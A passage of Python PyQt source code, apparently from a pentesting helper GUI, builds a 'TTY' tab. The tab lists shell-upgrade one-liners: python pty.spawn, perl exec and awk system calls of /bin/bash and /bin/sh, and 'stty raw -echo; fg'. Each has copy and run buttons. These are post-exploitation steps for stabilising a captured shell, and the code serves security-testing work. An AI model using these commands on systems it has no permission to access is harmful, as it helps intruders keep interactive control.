        self.wpe_34_spacer2.setFixedWidth(40)
        self.wpe_34_spacer2.setFixedHeight(50)
     
        # wpe_34 spacer & divider layout
        self.tab4_container_layout.insertWidget(714, self.wpe_34_spacer1)
        self.tab4_container_layout.insertWidget(715, self.wpe_34_divider1)
        self.tab4_container_layout.insertWidget(716, self.wpe_34_divider2)
        self.tab4_container_layout.insertWidget(717, self.wpe_34_spacer2)
        self.tab4_container_layout.addStretch()

#### TTY
    def tty(self):
        if not hasattr(self, 'tab5_container'):
            self.tab5_container = QWidget()
            self.tab5_container_layout = QVBoxLayout(self.tab5_container)
            self.tab5_container.setLayout(self.tab5_container_layout)
            self.scroll = QScrollArea()
            self.scroll.setWidget(self.tab5_container)
            self.scroll.setWidgetResizable(True)
            self.tab5_container.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
            self.scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
            self.tab5_container_layout.setContentsMargins(0,0,0,0)
            self.tab5_container.adjustSize()
            
            self.tab5.setLayout(QVBoxLayout())
            self.tab5.layout().addWidget(self.scroll)
        
        # tty_top_divider 1
        if hasattr(self, 'tty_top_divider1'):
            self.tab5_container_layout.removeWidget(self.tty_top_divider1)
            self.tty_top_divider1.deleteLater()
        self.tty_top_divider1 = QFrame()
        self.tty_top_divider1.setFrameShape(QFrame.HLine)
        self.tty_top_divider1.setLineWidth(3)
        self.tty_top_divider1.setStyleSheet("color: #20C20E;")
        
        # tty_top_divider2
        if hasattr(self, 'tty_top_divider2'):
            self.tab5_container_layout.removeWidget(self.tty_top_divider2)
            self.tty_top_divider2.deleteLater()
        self.tty_top_divider2 = QFrame()
        self.tty_top_divider2.setFrameShape(QFrame.HLine)
        self.tty_top_divider2.setLineWidth(3)
        self.tty_top_divider2.setStyleSheet("color: #20C20E;")
        
        # tty_top_spacer1
        if hasattr(self, 'tty_top_spacer1'):
            self.tab5_container_layout.removeWidget(self.tty_top_spacer1)
            self.tty_top_spacer1.deleteLater()
        self.tty_top_spacer1 = QLabel()
        self.tty_top_spacer1.setFixedWidth(40)
        self.tty_top_spacer1.setFixedHeight(50)
        
        # tty_top_spacer & divider layout
        self.tab5_container_layout.insertWidget(1, self.tty_top_divider1)
        self.tab5_container_layout.insertWidget(2, self.tty_top_divider2)
        self.tab5_container_layout.insertWidget(3, self.tty_top_spacer1)
        self.tab5_container_layout.addStretch()

# tty_python
        if hasattr(self, 'tty_python'):
            self.tab5_container_layout.removeWidget(self.tty_python)
            self.tty_python.deleteLater()
        self.tty_python = QLabel("[+ Python ]")
        self.tty_python.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab5_container_layout.insertWidget(4,self.tty_python)

        # tty_python_Scan1
        if hasattr(self, 'tty_python_Scan1'):
            self.tab5_container_layout.removeWidget(self.tty_python_Scan1)
            self.tty_python_Scan1.deleteLater()
        self.tty_python_Scan1 = QLabel("python -c 'import pty; pty.spawn(\"/bin/bash\")'")
        self.tty_python_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # tty_python_Scan1 copy button
        if hasattr(self, 'tty_python_Scan1_Copy'):
            self.tab5_container_layout.removeWidget(self.tty_python_Scan1_Copy)
            self.tty_python_Scan1_Copy.deleteLater()
        self.tty_python_Scan1_Copy = QPushButton()
        self.tty_python_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.tty_python_Scan1_Copy.setFixedSize(QSize(20,20))
        self.tty_python_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.tty_python_Scan1.text()))
        self.tty_python_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_python_Scan1 run button
        if hasattr(self, 'tty_python_Scan1_Run'):
            self.tab5_container_layout.removeWidget(self.tty_python_Scan1_Run)
            self.tty_python_Scan1_Run.deleteLater()
        self.tty_python_Scan1_Run = QPushButton()
        self.tty_python_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.tty_python_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.tty_python_Scan1.text() + "; bash"
        self.tty_python_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.tty_python_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_python_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.tty_python_Scan1_Copy)
        label_layout.addWidget(self.tty_python_Scan1_Run)
        label_layout.addWidget(self.tty_python_Scan1)
        self.tab5_container_layout.insertLayout(5, label_layout)
        self.tab5_container_layout.addStretch()

        # tty_python_Scan2
        if hasattr(self, 'tty_python_Scan2'):
            self.tab5_container_layout.removeWidget(self.tty_python_Scan2)
            self.tty_python_Scan2.deleteLater()
        self.tty_python_Scan2 = QLabel("python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
        self.tty_python_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # tty_python_Scan2 copy button
        if hasattr(self, 'tty_python_Scan2_Copy'):
            self.tab5_container_layout.removeWidget(self.tty_python_Scan2_Copy)
            self.tty_python_Scan2_Copy.deleteLater()
        self.tty_python_Scan2_Copy = QPushButton()
        self.tty_python_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.tty_python_Scan2_Copy.setFixedSize(QSize(20,20))
        self.tty_python_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.tty_python_Scan2.text()))
        self.tty_python_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_python_Scan2 run button
        if hasattr(self, 'tty_python_Scan2_Run'):
            self.tab5_container_layout.removeWidget(self.tty_python_Scan2_Run)
            self.tty_python_Scan2_Run.deleteLater()
        self.tty_python_Scan2_Run = QPushButton()
        self.tty_python_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.tty_python_Scan2_Run.setFixedSize(QSize(20,20))
        command10 = self.tty_python_Scan2.text() + "; bash"
        self.tty_python_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.tty_python_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_python_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.tty_python_Scan2_Copy)
        label_layout.addWidget(self.tty_python_Scan2_Run)
        label_layout.addWidget(self.tty_python_Scan2)
        self.tab5_container_layout.insertLayout(6, label_layout)
        self.tab5_container_layout.addStretch()

        # tty_python_Scan3
        if hasattr(self, 'tty_python_Scan3'):
            self.tab5_container_layout.removeWidget(self.tty_python_Scan3)
            self.tty_python_Scan3.deleteLater()
        self.tty_python_Scan3 = QLabel("export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp")
        self.tty_python_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # tty_python_Scan3 copy button
        if hasattr(self, 'tty_python_Scan3_Copy'):
            self.tab5_container_layout.removeWidget(self.tty_python_Scan3_Copy)
            self.tty_python_Scan3_Copy.deleteLater()
        self.tty_python_Scan3_Copy = QPushButton()
        self.tty_python_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.tty_python_Scan3_Copy.setFixedSize(QSize(20,20))
        self.tty_python_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.tty_python_Scan3.text()))
        self.tty_python_Scan3_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_python_Scan3 run button
        if hasattr(self, 'tty_python_Scan3_Run'):
            self.tab5_container_layout.removeWidget(self.tty_python_Scan3_Run)
            self.tty_python_Scan3_Run.deleteLater()
        self.tty_python_Scan3_Run = QPushButton()
        self.tty_python_Scan3_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.tty_python_Scan3_Run.setFixedSize(QSize(20,20))
        command10 = self.tty_python_Scan3.text() + "; bash"
        self.tty_python_Scan3_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.tty_python_Scan3_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_python_Scan3 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.tty_python_Scan3_Copy)
        label_layout.addWidget(self.tty_python_Scan3_Run)
        label_layout.addWidget(self.tty_python_Scan3)
        self.tab5_container_layout.insertLayout(7, label_layout)
        self.tab5_container_layout.addStretch()

        # tty_python_Scan4
        if hasattr(self, 'tty_python_Scan4'):
            self.tab5_container_layout.removeWidget(self.tty_python_Scan4)
            self.tty_python_Scan4.deleteLater()
        self.tty_python_Scan4 = QLabel("export TERM=xterm-256color")
        self.tty_python_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # tty_python_Scan4 copy button
        if hasattr(self, 'tty_python_Scan4_Copy'):
            self.tab5_container_layout.removeWidget(self.tty_python_Scan4_Copy)
            self.tty_python_Scan4_Copy.deleteLater()
        self.tty_python_Scan4_Copy = QPushButton()
        self.tty_python_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.tty_python_Scan4_Copy.setFixedSize(QSize(20,20))
        self.tty_python_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.tty_python_Scan4.text()))
        self.tty_python_Scan4_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_python_Scan4 run button
        if hasattr(self, 'tty_python_Scan4_Run'):
            self.tab5_container_layout.removeWidget(self.tty_python_Scan4_Run)
            self.tty_python_Scan4_Run.deleteLater()
        self.tty_python_Scan4_Run = QPushButton()
        self.tty_python_Scan4_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.tty_python_Scan4_Run.setFixedSize(QSize(20,20))
        command10 = self.tty_python_Scan4.text() + "; bash"
        self.tty_python_Scan4_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.tty_python_Scan4_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_python_Scan4 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.tty_python_Scan4_Copy)
        label_layout.addWidget(self.tty_python_Scan4_Run)
        label_layout.addWidget(self.tty_python_Scan4)
        self.tab5_container_layout.insertLayout(8, label_layout)
        self.tab5_container_layout.addStretch()

        # tty_python_Scan5
        if hasattr(self, 'tty_python_Scan5'):
            self.tab5_container_layout.removeWidget(self.tty_python_Scan5)
            self.tty_python_Scan5.deleteLater()
        self.tty_python_Scan5 = QLabel("alias ll='ls -lsaht --color=auto'")
        self.tty_python_Scan5.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # tty_python_Scan5 copy button
        if hasattr(self, 'tty_python_Scan5_Copy'):
            self.tab5_container_layout.removeWidget(self.tty_python_Scan5_Copy)
            self.tty_python_Scan5_Copy.deleteLater()
        self.tty_python_Scan5_Copy = QPushButton()
        self.tty_python_Scan5_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.tty_python_Scan5_Copy.setFixedSize(QSize(20,20))
        self.tty_python_Scan5_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.tty_python_Scan5.text()))
        self.tty_python_Scan5_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_python_Scan5 run button
        if hasattr(self, 'tty_python_Scan5_Run'):
            self.tab5_container_layout.removeWidget(self.tty_python_Scan5_Run)
            self.tty_python_Scan5_Run.deleteLater()
        self.tty_python_Scan5_Run = QPushButton()
        self.tty_python_Scan5_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.tty_python_Scan5_Run.setFixedSize(QSize(20,20))
        command10 = self.tty_python_Scan5.text() + "; bash"
        self.tty_python_Scan5_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.tty_python_Scan5_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_python_Scan5 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.tty_python_Scan5_Copy)
        label_layout.addWidget(self.tty_python_Scan5_Run)
        label_layout.addWidget(self.tty_python_Scan5)
        self.tab5_container_layout.insertLayout(9, label_layout)
        self.tab5_container_layout.addStretch()

	# tty_python_Scan6
        if hasattr(self, 'tty_python_Scan6'):
            self.tab5_container_layout.removeWidget(self.tty_python_Scan6)
            self.tty_python_Scan6.deleteLater()
        self.tty_python_Scan6 = QLabel("Keyboard Shortcut: Ctrl + Z (Background Process)")
        self.tty_python_Scan6.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # tty_python_Scan6 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.tty_python_Scan6)
        self.tab5_container_layout.insertLayout(10, label_layout)
        self.tab5_container_layout.addStretch()

        # tty_python_Scan7
        if hasattr(self, 'tty_python_Scan7'):
            self.tab5_container_layout.removeWidget(self.tty_python_Scan7)
            self.tty_python_Scan7.deleteLater()
        self.tty_python_Scan7 = QLabel("stty raw -echo ; fg ; reset")
        self.tty_python_Scan7.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # tty_python_Scan7 copy button
        if hasattr(self, 'tty_python_Scan7_Copy'):
            self.tab5_container_layout.removeWidget(self.tty_python_Scan7_Copy)
            self.tty_python_Scan7_Copy.deleteLater()
        self.tty_python_Scan7_Copy = QPushButton()
        self.tty_python_Scan7_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.tty_python_Scan7_Copy.setFixedSize(QSize(20,20))
        self.tty_python_Scan7_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.tty_python_Scan7.text()))
        self.tty_python_Scan7_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_python_Scan7 run button
        if hasattr(self, 'tty_python_Scan7_Run'):
            self.tab5_container_layout.removeWidget(self.tty_python_Scan7_Run)
            self.tty_python_Scan7_Run.deleteLater()
        self.tty_python_Scan7_Run = QPushButton()
        self.tty_python_Scan7_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.tty_python_Scan7_Run.setFixedSize(QSize(20,20))
        command10 = self.tty_python_Scan7.text() + "; bash"
        self.tty_python_Scan7_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.tty_python_Scan7_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_python_Scan7 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.tty_python_Scan7_Copy)
        label_layout.addWidget(self.tty_python_Scan7_Run)
        label_layout.addWidget(self.tty_python_Scan7)
        self.tab5_container_layout.insertLayout(11, label_layout)
        self.tab5_container_layout.addStretch()

        # tty_python_Scan8
        if hasattr(self, 'tty_python_Scan8'):
            self.tab5_container_layout.removeWidget(self.tty_python_Scan8)
            self.tty_python_Scan8.deleteLater()
        self.tty_python_Scan8 = QLabel("stty columns 200 rows 200")
        self.tty_python_Scan8.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # tty_python_Scan8 copy button
        if hasattr(self, 'tty_python_Scan8_Copy'):
            self.tab5_container_layout.removeWidget(self.tty_python_Scan8_Copy)
            self.tty_python_Scan8_Copy.deleteLater()
        self.tty_python_Scan8_Copy = QPushButton()
        self.tty_python_Scan8_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.tty_python_Scan8_Copy.setFixedSize(QSize(20,20))
        self.tty_python_Scan8_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.tty_python_Scan8.text()))
        self.tty_python_Scan8_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_python_Scan8 run button
        if hasattr(self, 'tty_python_Scan8_Run'):
            self.tab5_container_layout.removeWidget(self.tty_python_Scan8_Run)
            self.tty_python_Scan8_Run.deleteLater()
        self.tty_python_Scan8_Run = QPushButton()
        self.tty_python_Scan8_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.tty_python_Scan8_Run.setFixedSize(QSize(20,20))
        command10 = self.tty_python_Scan8.text() + "; bash"
        self.tty_python_Scan8_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.tty_python_Scan8_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_python_Scan8 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.tty_python_Scan8_Copy)
        label_layout.addWidget(self.tty_python_Scan8_Run)
        label_layout.addWidget(self.tty_python_Scan8)
        self.tab5_container_layout.insertLayout(12, label_layout)
        self.tab5_container_layout.addStretch()

        # tty_python_divider 1
        if hasattr(self, 'tty_python_divider1'):
            self.tab5_container_layout.removeWidget(self.tty_python_divider1)
            self.tty_python_divider1.deleteLater()
        self.tty_python_divider1 = QFrame()
        self.tty_python_divider1.setFrameShape(QFrame.HLine)
        self.tty_python_divider1.setLineWidth(3)
        self.tty_python_divider1.setStyleSheet("color: #20C20E;")
        
        # tty_python_divider2
        if hasattr(self, 'tty_python_divider2'):
            self.tab5_container_layout.removeWidget(self.tty_python_divider2)
            self.tty_python_divider2.deleteLater()
        self.tty_python_divider2 = QFrame()
        self.tty_python_divider2.setFrameShape(QFrame.HLine)
        self.tty_python_divider2.setLineWidth(3)
        self.tty_python_divider2.setStyleSheet("color: #20C20E;")
        
        # tty_python_spacer1
        if hasattr(self, 'tty_python_spacer1'):
            self.tab5_container_layout.removeWidget(self.tty_python_spacer1)
            self.tty_python_spacer1.deleteLater()
        self.tty_python_spacer1 = QLabel()
        self.tty_python_spacer1.setFixedWidth(40)
        self.tty_python_spacer1.setFixedHeight(50)
        
        # tty_python_spacer2
        if hasattr(self, 'tty_python_spacer2'):
            self.tab5_container_layout.removeWidget(self.tty_python_spacer2)
            self.tty_python_spacer2.deleteLater()
        self.tty_python_spacer2 = QLabel()
        self.tty_python_spacer2.setFixedWidth(40)
        self.tty_python_spacer2.setFixedHeight(50)

        # tty_python_spacer & divider layout
        self.tab5_container_layout.insertWidget(13, self.tty_python_spacer1)
        self.tab5_container_layout.insertWidget(14, self.tty_python_divider1)
        self.tab5_container_layout.insertWidget(15, self.tty_python_divider2)
        self.tab5_container_layout.insertWidget(16, self.tty_python_spacer2)
        self.tab5_container_layout.addStretch()

# tty_perl
        if hasattr(self, 'tty_perl'):
            self.tab5_container_layout.removeWidget(self.tty_perl)
            self.tty_perl.deleteLater()
        self.tty_perl = QLabel("[+ Perl]")
        self.tty_perl.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab5_container_layout.insertWidget(17,self.tty_perl)

        # tty_perl_Scan1
        if hasattr(self, 'tty_perl_Scan1'):
            self.tab5_container_layout.removeWidget(self.tty_perl_Scan1)
            self.tty_perl_Scan1.deleteLater()
        self.tty_perl_Scan1 = QLabel("perl -e 'exec \"/bin/bash\";'")
        self.tty_perl_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # tty_perl_Scan1 copy button
        if hasattr(self, 'tty_perl_Scan1_Copy'):
            self.tab5_container_layout.removeWidget(self.tty_perl_Scan1_Copy)
            self.tty_perl_Scan1_Copy.deleteLater()
        self.tty_perl_Scan1_Copy = QPushButton()
        self.tty_perl_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.tty_perl_Scan1_Copy.setFixedSize(QSize(20,20))
        self.tty_perl_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.tty_perl_Scan1.text()))
        self.tty_perl_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_perl_Scan1 run button
        if hasattr(self, 'tty_perl_Scan1_Run'):
            self.tab5_container_layout.removeWidget(self.tty_perl_Scan1_Run)
            self.tty_perl_Scan1_Run.deleteLater()
        self.tty_perl_Scan1_Run = QPushButton()
        self.tty_perl_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.tty_perl_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.tty_perl_Scan1.text() + "; bash"
        self.tty_perl_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.tty_perl_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_perl_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.tty_perl_Scan1_Copy)
        label_layout.addWidget(self.tty_perl_Scan1_Run)
        label_layout.addWidget(self.tty_perl_Scan1)
        self.tab5_container_layout.insertLayout(18, label_layout)
        self.tab5_container_layout.addStretch()

        # tty_perl_Scan2
        if hasattr(self, 'tty_perl_Scan2'):
            self.tab5_container_layout.removeWidget(self.tty_perl_Scan2)
            self.tty_perl_Scan2.deleteLater()
        self.tty_perl_Scan2 = QLabel("perl -e 'exec \"/bin/sh\";'")
        self.tty_perl_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # tty_perl_Scan2 copy button
        if hasattr(self, 'tty_perl_Scan2_Copy'):
            self.tab5_container_layout.removeWidget(self.tty_perl_Scan2_Copy)
            self.tty_perl_Scan2_Copy.deleteLater()
        self.tty_perl_Scan2_Copy = QPushButton()
        self.tty_perl_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.tty_perl_Scan2_Copy.setFixedSize(QSize(20,20))
        self.tty_perl_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.tty_perl_Scan2.text()))
        self.tty_perl_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_perl_Scan2 run button
        if hasattr(self, 'tty_perl_Scan2_Run'):
            self.tab5_container_layout.removeWidget(self.tty_perl_Scan2_Run)
            self.tty_perl_Scan2_Run.deleteLater()
        self.tty_perl_Scan2_Run = QPushButton()
        self.tty_perl_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.tty_perl_Scan2_Run.setFixedSize(QSize(20,20))
        command10 = self.tty_perl_Scan2.text() + "; bash"
        self.tty_perl_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.tty_perl_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_perl_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.tty_perl_Scan2_Copy)
        label_layout.addWidget(self.tty_perl_Scan2_Run)
        label_layout.addWidget(self.tty_perl_Scan2)
        self.tab5_container_layout.insertLayout(19, label_layout)
        self.tab5_container_layout.addStretch()

        # tty_perl_divider 1
        if hasattr(self, 'tty_perl_divider1'):
            self.tab5_container_layout.removeWidget(self.tty_perl_divider1)
            self.tty_perl_divider1.deleteLater()
        self.tty_perl_divider1 = QFrame()
        self.tty_perl_divider1.setFrameShape(QFrame.HLine)
        self.tty_perl_divider1.setLineWidth(3)
        self.tty_perl_divider1.setStyleSheet("color: #20C20E;")
        
        # tty_perl_divider2
        if hasattr(self, 'tty_perl_divider2'):
            self.tab5_container_layout.removeWidget(self.tty_perl_divider2)
            self.tty_perl_divider2.deleteLater()
        self.tty_perl_divider2 = QFrame()
        self.tty_perl_divider2.setFrameShape(QFrame.HLine)
        self.tty_perl_divider2.setLineWidth(3)
        self.tty_perl_divider2.setStyleSheet("color: #20C20E;")
        
        # tty_perl_spacer1
        if hasattr(self, 'tty_perl_spacer1'):
            self.tab5_container_layout.removeWidget(self.tty_perl_spacer1)
            self.tty_perl_spacer1.deleteLater()
        self.tty_perl_spacer1 = QLabel()
        self.tty_perl_spacer1.setFixedWidth(40)
        self.tty_perl_spacer1.setFixedHeight(50)
        
        # tty_perl_spacer2
        if hasattr(self, 'tty_perl_spacer2'):
            self.tab5_container_layout.removeWidget(self.tty_perl_spacer2)
            self.tty_perl_spacer2.deleteLater()
        self.tty_perl_spacer2 = QLabel()
        self.tty_perl_spacer2.setFixedWidth(40)
        self.tty_perl_spacer2.setFixedHeight(50)

        # tty_perl_spacer & divider layout
        self.tab5_container_layout.insertWidget(20, self.tty_perl_spacer1)
        self.tab5_container_layout.insertWidget(21, self.tty_perl_divider1)
        self.tab5_container_layout.insertWidget(22, self.tty_perl_divider2)
        self.tab5_container_layout.insertWidget(23, self.tty_perl_spacer2)
        self.tab5_container_layout.addStretch()

# tty_awk
        if hasattr(self, 'tty_awk'):
            self.tab5_container_layout.removeWidget(self.tty_awk)
            self.tty_awk.deleteLater()
        self.tty_awk = QLabel("[+ Awk]")
        self.tty_awk.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab5_container_layout.insertWidget(24,self.tty_awk)

        # tty_awk_Scan1
        if hasattr(self, 'tty_awk_Scan1'):
            self.tab5_container_layout.removeWidget(self.tty_awk_Scan1)
            self.tty_awk_Scan1.deleteLater()
        self.tty_awk_Scan1 = QLabel("awk 'BEGIN {system(\"/bin/bash -i\")}'")
        self.tty_awk_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # tty_awk_Scan1 copy button
        if hasattr(self, 'tty_awk_Scan1_Copy'):
            self.tab5_container_layout.removeWidget(self.tty_awk_Scan1_Copy)
            self.tty_awk_Scan1_Copy.deleteLater()
        self.tty_awk_Scan1_Copy = QPushButton()
        self.tty_awk_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.tty_awk_Scan1_Copy.setFixedSize(QSize(20,20))
        self.tty_awk_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.tty_awk_Scan1.text()))
        self.tty_awk_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_awk_Scan1 run button
        if hasattr(self, 'tty_awk_Scan1_Run'):
            self.tab5_container_layout.removeWidget(self.tty_awk_Scan1_Run)
            self.tty_awk_Scan1_Run.deleteLater()
        self.tty_awk_Scan1_Run = QPushButton()
        self.tty_awk_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.tty_awk_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.tty_awk_Scan1.text() + "; bash"
        self.tty_awk_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.tty_awk_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_awk_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.tty_awk_Scan1_Copy)
        label_layout.addWidget(self.tty_awk_Scan1_Run)
        label_layout.addWidget(self.tty_awk_Scan1)
        self.tab5_container_layout.insertLayout(25, label_layout)
        self.tab5_container_layout.addStretch()

        # tty_awk_Scan1
        if hasattr(self, 'tty_awk_Scan1'):
            self.tab5_container_layout.removeWidget(self.tty_awk_Scan1)
            self.tty_awk_Scan1.deleteLater()
        self.tty_awk_Scan1 = QLabel("awk 'BEGIN {system(\"/bin/sh -i\")}'")
        self.tty_awk_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # tty_awk_Scan1 copy button
        if hasattr(self, 'tty_awk_Scan1_Copy'):
            self.tab5_container_layout.removeWidget(self.tty_awk_Scan1_Copy)
            self.tty_awk_Scan1_Copy.deleteLater()
        self.tty_awk_Scan1_Copy = QPushButton()
        self.tty_awk_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.tty_awk_Scan1_Copy.setFixedSize(QSize(20,20))
        self.tty_awk_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.tty_awk_Scan1.text()))
        self.tty_awk_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_awk_Scan1 run button
        if hasattr(self, 'tty_awk_Scan1_Run'):
            self.tab5_container_layout.removeWidget(self.tty_awk_Scan1_Run)
            self.tty_awk_Scan1_Run.deleteLater()
        self.tty_awk_Scan1_Run = QPushButton()
        self.tty_awk_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.tty_awk_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.tty_awk_Scan1.text() + "; bash"
        self.tty_awk_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.tty_awk_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_awk_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.tty_awk_Scan1_Copy)
        label_layout.addWidget(self.tty_awk_Scan1_Run)
        label_layout.addWidget(self.tty_awk_Scan1)
        self.tab5_container_layout.insertLayout(26, label_layout)
        self.tab5_container_layout.addStretch()

        # tty_awk_divider 1
        if hasattr(self, 'tty_awk_divider1'):
            self.tab5_container_layout.removeWidget(self.tty_awk_divider1)
            self.tty_awk_divider1.deleteLater()
        self.tty_awk_divider1 = QFrame()
        self.tty_awk_divider1.setFrameShape(QFrame.HLine)
        self.tty_awk_divider1.setLineWidth(3)
        self.tty_awk_divider1.setStyleSheet("color: #20C20E;")
        
        # tty_awk_divider2
        if hasattr(self, 'tty_awk_divider2'):
